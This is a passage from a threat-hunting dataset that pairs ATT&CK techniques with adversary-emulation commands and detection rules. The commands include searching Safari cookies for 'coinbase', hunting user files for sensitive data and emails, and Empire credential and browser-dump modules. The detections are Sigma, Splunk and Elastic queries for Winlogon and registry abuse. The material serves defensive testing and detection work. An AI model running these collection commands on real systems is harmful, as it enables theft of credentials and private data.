HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are\n    used to manage additional helper programs and functionalities that support Winlogon. Malicious modifications to these Registry keys may cause Winlogon to load\n    and execute malicious DLLs and/or executables.\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1004/T1004.yaml\nlogsource:\n    product: windows\n    service: powershell\n    description: 'Script block logging must be enabled'\ndetection:\n    selection:\n        EventID: 4104\n    keyword1: \n        - '*Set-ItemProperty*'\n        - '*New-Item*'\n    keyword2: \n        - '*CurrentVersion\\Winlogon*'\n    condition: selection and ( keyword1 and keyword2 )\nfalsepositives:\n    - Unknown\nlevel: medium\ntags:\n    - attack.persistence\n    - attack.t1004", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Winlogon Helper DLL\nid: 851c506b-6b7c-4ce2-8802-c703009d03c0\nstatus: experimental\ndescription: Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.\n    Registry entries in HKLM\\Software[Wow6432Node]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are\n    used to manage additional helper programs and functionalities that support Winlogon. Malicious modifications to these Registry keys may cause Winlogon to load\n    and execute malicious DLLs and/or executables.\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1004/T1004.yaml\nlogsource:\n    product: windows\n    service: powershell\n    description: 'Script block logging must be enabled'\ndetection:\n    selection:\n        EventID: 4104\n    keyword1: \n        - '*Set-ItemProperty*'\n        - '*New-Item*'\n    keyword2: \n        - '*CurrentVersion\\Winlogon*'\n    condition: selection and ( keyword1 and keyword2 )\nfalsepositives:\n    - Unknown\nlevel: medium\ntags:\n    - attack.persistence\n    - attack.t1004", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4104\" AND \\\\*.keyword:(*Set\\\\-ItemProperty* OR *New\\\\-Item*) AND \"*CurrentVersion\\\\\\\\Winlogon*\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Winlogon-Helper-DLL <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Winlogon Helper DLL\",\\n    \"description\": \"Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\\\\\\\Software[Wow6432Node]Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\ and HKCU\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Winlogon\\\\\\\\ are used to manage additional helper programs and functionalities that support Winlogon. Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1004\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4104\\\\\" AND \\\\\\\\*.keyword:(*Set\\\\\\\\-ItemProperty* OR *New\\\\\\\\-Item*) AND \\\\\"*CurrentVersion\\\\\\\\\\\\\\\\Winlogon*\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4104\\\\\" AND \\\\\\\\*.keyword:(*Set\\\\\\\\-ItemProperty* OR *New\\\\\\\\-Item*) AND \\\\\"*CurrentVersion\\\\\\\\\\\\\\\\Winlogon*\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Winlogon Helper DLL\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4104\" AND \\\\*.keyword:(*Set\\\\-ItemProperty* OR *New\\\\-Item*) AND \"*CurrentVersion\\\\\\\\Winlogon*\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4104\" (\"*Set-ItemProperty*\" OR \"*New-Item*\") \"*CurrentVersion\\\\\\\\Winlogon*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"4104\" (\"*Set-ItemProperty*\" OR \"*New-Item*\") \"*CurrentVersion\\\\\\\\Winlogon*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4104)(?=.*(?:.*(?:.*.*Set-ItemProperty.*|.*.*New-Item.*)))(?=.*.*CurrentVersion\\\\Winlogon.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1005/T1005.yaml", "command": "cd ~/Library/Cookies\ngrep -q \"coinbase\" \"Cookies.binarycookies\"\n", "name": null}, {"source": "data/abilities/collection/02de522f-7e0a-4544-8afc-0c195f400f5f.yml", "command": {"darwin": {"sh": {"command": "pip install stormssh && storm list\n"}}, "linux": {"sh": {"command": "pip install stormssh && storm list"}}}, "name": "Search for valid SSH commands in the config file"}, {"source": "data/abilities/collection/1f7ff232-ebf8-42bf-a3c4-657855794cfe.yml", "command": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"}}}, "name": "Grep for all emails for the given target company"}, {"source": "data/abilities/collection/89955f55-529d-4d58-bed4-fed9e42515ec.yml", "command": {"darwin": {"sh": {"command": "curl #{remote.host.socket}\n"}}, "linux": {"sh": {"command": "curl #{remote.host.socket}\n"}}}, "name": "See the raw content of a socket"}, {"source": "data/abilities/collection/90c2efaa-8205-480d-8bb6-61d90dbaf81b.yml", "command": {"windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n"}}, "darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n"}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n"}}}, "name": "Locate files deemed sensitive"}, {"source": "data/abilities/collection/d69e8660-62c9-431e-87eb-8cf6bd4e35cf.yml", "command": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"}}}, "name": "Grep for IP addresses in file system per user"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_sql_column_sample_data", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_sql_column_sample_data", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_sql_query", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/get_sql_query", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/minidump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/minidump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/sessiongopher", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/sessiongopher", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/browser_dump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/browser_dump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/imessage_dump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/imessage_dump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/osx/situational_awareness", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/situational_awareness/host/osx/situational_awareness", "name": "Empire Module Command"}], "command_list": ["cd ~/Library/Cookies\ngrep -q \"coinbase\" \"Cookies.binarycookies\"\n", {"darwin": {"sh": {"command": "pip install stormssh && storm list\n"}}, "linux": {"sh": {"command": "pip install stormssh && storm list"}}}, {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"}}}, {"darwin": {"sh": {"command": "curl #{remote.host.socket}\n"}}, "linux": {"sh": {"command": "curl #{remote.host.socket}\n"}}}, {"windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n"}}, "darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n"}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n"}}}, {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"}}}, "powershell/collection/get_sql_column_sample_data", "powershell/collection/get_sql_column_sample_data", "powershell/collection/get_sql_query", "powershell/collection/get_sql_query", "powershell/collection/minidump", "powershell/collection/minidump", "powershell/credentials/sessiongopher", "powershell/credentials/sessiongopher", "python/collection/osx/browser_dump", "python/collection/osx/browser_dump", "python/collection/osx/imessage_dump", "python/collection/osx/imessage_dump", "python/situational_awareness/host/osx/situational_awareness", "python/situational_awareness/host/osx/situational_awareness"], "technique_id": "T1005", "parsed_datasets": [{"Atomic Red Team Test - Data from Local System": {"display_name": "Data from Local System", "atomic_tests": [{"description": "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n", "supported_platforms": ["macos"], "name": "Search macOS Safari Cookies", "input_arguments": {"search_string": {"default": "coinbase", "type": "string", "description": "String to search Safari cookies to find."}}, "executor": {"elevation_required": false, "command": "cd ~/Library/Cookies\ngrep -q \"#{search_string}\" \"Cookies.binarycookies\"\n", "name": "sh"}}], "attack_technique": "T1005"}}, {"Mitre Stockpile - Search for valid SSH commands in the config file": {"platforms": {"darwin": {"sh": {"command": "pip install stormssh && storm list\n"}}, "linux": {"sh": {"command": "pip install stormssh && storm list"}}}, "description": "Search for valid SSH commands in the config file", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "id": "02de522f-7e0a-4544-8afc-0c195f400f5f", "name": "Parse SSH config"}}, {"Mitre Stockpile - Grep for all emails for the given target company": {"platforms": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}], "description": "Grep for all emails for the given target company", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "id": "1f7ff232-ebf8-42bf-a3c4-657855794cfe", "name": "Find company emails"}}, {"Mitre Stockpile - See the raw content of a socket": {"platforms": {"darwin": {"sh": {"command": "curl #{remote.host.socket}\n"}}, "linux": {"sh": {"command": "curl #{remote.host.socket}\n"}}}, "description": "See the raw content of a socket", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "id": "89955f55-529d-4d58-bed4-fed9e42515ec", "name": "cURL socket address"}}, {"Mitre Stockpile - Locate files deemed sensitive": {"platforms": {"windows": {"psh,pwsh": {"command": "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n"}}, "darwin": {"sh": {"command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n"}}, "linux": {"sh": {"command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n"}}}, "description": "Locate files deemed sensitive", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "name": "Find files"}}, {"Mitre Stockpile - Grep for IP addresses in file system per user": {"platforms": {"darwin": {"sh": {"command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.paw_provenance": [{"source": "host.user.name"}]}], "description": "Grep for IP addresses in file system per user", "tactic": "collection", "technique": {"attack_id": "T1005", "name": "Data from Local System"}, "id": "d69e8660-62c9-431e-87eb-8cf6bd4e35cf", "name": "Find IP addresses"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1005", "Empire Module": "powershell/collection/get_sql_column_sample_data", "Technique": "Data from Local System", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/get_sql_column_sample_data\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1005", "Empire Module": "powershell/collection/get_sql_query", "Technique": "Data from Local System", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/get_sql_query\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1005", "Empire Module": "powershell/collection/minidump", "Technique": "Data from Local System", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/minidump\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1005", "Empire Module": "powershell/credentials/sessiongopher", "Technique": "Data from Local System", "ATT&CK Technique #2": "T1145", "Concatenate for Python Dictionary": "\"powershell/credentials/sessiongopher\":  [\"T1005\",\"T1145\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1005", "Empire Module": "python/collection/osx/browser_dump", "Technique": "Data from Local System", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/browser_dump\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1005", "Empire Module": "python/collection/osx/imessage_dump", "Technique": "Data from Local System", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/imessage_dump\":  [\"T1005\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1005", "Empire Module": "python/situational_awareness/host/osx/situational_awareness", "Technique": "Data from Local System", "ATT&CK Technique #2": "T1082", "Concatenate for Python Dictionary": "\"python/situational_awareness/host/osx/situational_awareness\":  [\"T1005\",\"T1082\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1007/T1007.yaml", "command": "tasklist.exe\nsc query\nsc query state= all\n", "name": null}, {"source": "atomics/T1007/T1007.yaml", "command": "net.exe start >> C:\\Windows\\Temp\\service-list.txt\n", "name": null}, {"source": "data/abilities/discovery/c6607391-d02c-44b5-9b13-d3492ca58599.yml", "command": {"windows": {"psh": {"command": "Get-Service"}}}, "name": "Identify system services"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> sc query\n\nSERVICE_NAME: BFE\nDISPLAY_NAME: Base Filtering Engine\nTYPE: 20 WIN32_SHARE_PROCESS\nSTATE: 4 RUNNING\n(STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\nWIN32_EXIT_CODE: 0 (0x0)\nSERVICE_EXIT_CODE: 0 (0x0)\nCHECKPOINT: 0x0\nWAIT_HINT: 0x0", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> tasklist / svc\n\nImage Name PID Service\n========================= ======== ================= ===========================\nSystem Idle Process 0 Temp Out\nSystem 4 Temp Out\nsmss.exe 288 temporary shortage\ncsrss.exe 420 temporary shortage\ncsrss.exe 532 temporary shortage\nwininit.exe 576 temporary shortage\nwinlogon.exe 584 temporary shortage\nservices.exe 664 temporary shortage", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> net start\nIt has been launched the following Windows services:\n\nBackground Tasks Infrastructure Service\nBase Filtering Engine\nCDPUserSvc_11e76e\nCertificate Propagation\nCNG Key Isolation\nCOM + Event System\nCOM + System Application", "name": "Dos"}], "command_list": ["tasklist.exe\nsc query\nsc query state= all\n", "net.exe start >> C:\\Windows\\Temp\\service-list.txt\n", {"windows": {"psh": {"command": "Get-Service"}}}, "Dos\nC: \\ Windows \\ system32> sc query\n\nSERVICE_NAME: BFE\nDISPLAY_NAME: Base Filtering Engine\nTYPE: 20 WIN32_SHARE_PROCESS\nSTATE: 4 RUNNING\n(STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)\nWIN32_EXIT_CODE: 0 (0x0)\nSERVICE_EXIT_CODE: 0 (0x0)\nCHECKPOINT: 0x0\nWAIT_HINT: 0x0", "Dos\nC: \\ Windows \\ system32> tasklist / svc\n\nImage Name PID Service\n========================= ======== ================= ===========================\nSystem Idle Process 0 Temp Out\nSystem 4 Temp Out\nsmss.exe 288 temporary shortage\ncsrss.exe 420 temporary shortage\ncsrss.exe 532 temporary shortage\nwininit.exe 576 temporary shortage\nwinlogon.exe 584 temporary shortage\nservices.exe 664 temporary shortage", "Dos\nC: \\ Windows \\ system32> net start\nIt has been launched the following Windows services:\n\nBackground Tasks Infrastructure Service\nBase Filtering Engine\nCDPUserSvc_11e76e\nCertificate Propagation\nCNG Key Isolation\nCOM + Event System\nCOM + System Application"], "technique_id": "T1007", "parsed_datasets": [{"Atomic Red Team Test - System Service Discovery": {"display_name": "System Service Discovery", "atomic_tests": [{"description": "Identify system services\n", "supported_platforms": ["windows"], "name": "System Service Discovery", "executor": {"elevation_required": true, "command": "tasklist.exe\nsc query\nsc query state= all\n", "name": "command_prompt"}}, {"description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n", "supported_platforms": ["windows"], "name": "System Service Discovery - net.exe", "input_arguments": {"output_file": {"default": "C:\\Windows\\Temp\\service-list.txt", "type": "Path", "description": "Path of file to hold net.exe output"}}, "executor": {"elevation_required": false, "command": "net.exe start >> #{output_file}\n", "name": "command_prompt", "cleanup_command": "del /f /q /s #{output_file} >nul 2>&1\n"}}], "attack_technique": "T1007"}}, {"Mitre Stockpile - Identify system services": {"platforms": {"windows": {"psh": {"command": "Get-Service"}}}, "description": "Identify system services", "tactic": "discovery", "technique": {"attack_id": "T1007", "name": "System Service Discovery"}, "id": "c6607391-d02c-44b5-9b13-d3492ca58599", "name": "Discover system services"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"or process_path contains \"tasklist.exe\"or process_path contains \"sc.exe\"or process_path contains \"wmic.exe\")and (file_directory contains \"net.exe\\\" start\"or file_directory contains \"tasklist.exe\\\" /SVC\"and file_directory contains \"sc.exe\\\" query\"or file_directory contains \"wmic.exe\\\" service where\")", "product": "Azure Sentinel", "name": "System Service Discovery"}, {"query": "title: Query Registry\nid: 970007b7-ce32-49d0-a4a4-fbef016950bd\nstatus: experimental\ndescription: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\reg.exe'\n        CommandLine|contains: \n            - 'query'\n            - 'save'\n            - 'export'\n    selection_2:\n        CommandLine|contains:\n            - 'currentVersion\\windows'\n            - 'currentVersion\\runServicesOnce'\n            - 'currentVersion\\runServices'\n            - 'winlogon\\'\n            - 'currentVersion\\shellServiceObjectDelayLoad'\n            - 'currentVersion\\runOnce'\n            - 'currentVersion\\runOnceEx'\n            - 'currentVersion\\run'\n            - 'currentVersion\\policies\\explorer\\run'\n            - 'currentcontrolset\\services'\n    condition: selection_1 and selection_2\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nlevel: low\ntags:\n    - attack.discovery\n    - attack.t1012\n    - attack.t1007", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Query Registry\nid: 970007b7-ce32-49d0-a4a4-fbef016950bd\nstatus: experimental\ndescription: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\reg.exe'\n        CommandLine|contains: \n            - 'query'\n            - 'save'\n            - 'export'\n    selection_2:\n        CommandLine|contains:\n            - 'currentVersion\\windows'\n            - 'currentVersion\\runServicesOnce'\n            - 'currentVersion\\runServices'\n            - 'winlogon\\'\n            - 'currentVersion\\shellServiceObjectDelayLoad'\n            - 'currentVersion\\runOnce'\n            - 'currentVersion\\runOnceEx'\n            - 'currentVersion\\run'\n            - 'currentVersion\\policies\\explorer\\run'\n            - 'currentcontrolset\\services'\n    condition: selection_1 and selection_2\nfields:\n    - Image\n    - CommandLine\n    - User\n    - LogonGuid\n    - Hashes\n    - ParentProcessGuid\n    - ParentCommandLine\nlevel: low\ntags:\n    - attack.discovery\n    - attack.t1012\n    - attack.t1007", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\reg.exe AND CommandLine.keyword:(*query* OR *save* OR *export*) AND CommandLine.keyword:(*currentVersion\\\\\\\\windows* OR *currentVersion\\\\\\\\runServicesOnce* OR *currentVersion\\\\\\\\runServices* OR *winlogon\\\\* OR *currentVersion\\\\\\\\shellServiceObjectDelayLoad* OR *currentVersion\\\\\\\\runOnce* OR *currentVersion\\\\\\\\runOnceEx* OR *currentVersion\\\\\\\\run* OR *currentVersion\\\\\\\\policies\\\\\\\\explorer\\\\\\\\run* OR *currentcontrolset\\\\\\\\services*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Query-Registry <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Query Registry\",\\n    \"description\": \"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1012\",\\n      \"attack.t1007\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\reg.exe AND CommandLine.keyword:(*query* OR *save* OR *export*) AND CommandLine.keyword:(*currentVersion\\\\\\\\\\\\\\\\windows* OR *currentVersion\\\\\\\\\\\\\\\\runServicesOnce* OR *currentVersion\\\\\\\\\\\\\\\\runServices* OR *winlogon\\\\\\\\* OR *currentVersion\\\\\\\\\\\\\\\\shellServiceObjectDelayLoad* OR *currentVersion\\\\\\\\\\\\\\\\runOnce* OR *currentVersion\\\\\\\\\\\\\\\\runOnceEx* OR *currentVersion\\\\\\\\\\\\\\\\run* OR *currentVersion\\\\\\\\\\\\\\\\policies\\\\\\\\\\\\\\\\explorer\\\\\\\\\\\\\\\\run* OR *currentcontrolset\\\\\\\\\\\\\\\\services*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\reg.exe AND CommandLine.keyword:(*query* OR *save* OR *export*) AND CommandLine.keyword:(*currentVersion\\\\\\\\\\\\\\\\windows* OR *currentVersion\\\\\\\\\\\\\\\\runServicesOnce* OR *currentVersion\\\\\\\\\\\\\\\\runServices* OR *winlogon\\\\\\\\* OR *currentVersion\\\\\\\\\\\\\\\\shellServiceObjectDelayLoad* OR *currentVersion\\\\\\\\\\\\\\\\runOnce* OR *currentVersion\\\\\\\\\\\\\\\\runOnceEx* OR *currentVersion\\\\\\\\\\\\\\\\run* OR *currentVersion\\\\\\\\\\\\\\\\policies\\\\\\\\\\\\\\\\explorer\\\\\\\\\\\\\\\\run* OR *currentcontrolset\\\\\\\\\\\\\\\\services*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Query Registry\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n            Image = {{_source.Image}}\\\\n      CommandLine = {{_source.CommandLine}}\\\\n             User = {{_source.User}}\\\\n        LogonGuid = {{_source.LogonGuid}}\\\\n           Hashes = {{_source.Hashes}}\\\\nParentProcessGuid = {{_source.ParentProcessGuid}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\reg.exe AND CommandLine.keyword:(*query* *save* *export*) AND CommandLine.keyword:(*currentVersion\\\\\\\\windows* *currentVersion\\\\\\\\runServicesOnce* *currentVersion\\\\\\\\runServices* *winlogon\\\\* *currentVersion\\\\\\\\shellServiceObjectDelayLoad* *currentVersion\\\\\\\\runOnce* *currentVersion\\\\\\\\runOnceEx* *currentVersion\\\\\\\\run* *currentVersion\\\\\\\\policies\\\\\\\\explorer\\\\\\\\run* *currentcontrolset\\\\\\\\services*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\reg.exe\" (CommandLine=\"*query*\" OR CommandLine=\"*save*\" OR CommandLine=\"*export*\") 